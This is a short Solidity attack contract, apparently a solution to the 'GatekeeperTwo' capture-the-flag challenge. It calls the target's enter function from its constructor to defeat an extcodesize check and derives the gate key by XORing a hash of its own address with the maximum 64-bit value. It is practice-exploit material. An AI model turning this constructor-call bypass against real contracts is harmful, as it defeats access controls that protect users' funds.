// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./gate_keeper_two.sol";

contract AttackGatekeeperTwo {
    
    GatekeeperTwo gatekeeperTwoContract;

    constructor(address gatekeeperTwoContractAddress){
        gatekeeperTwoContract = GatekeeperTwo(gatekeeperTwoContractAddress);
        uint64 secret_number = uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ 18446744073709551615;
        gatekeeperTwoContract.enter(bytes8(secret_number));
    }
}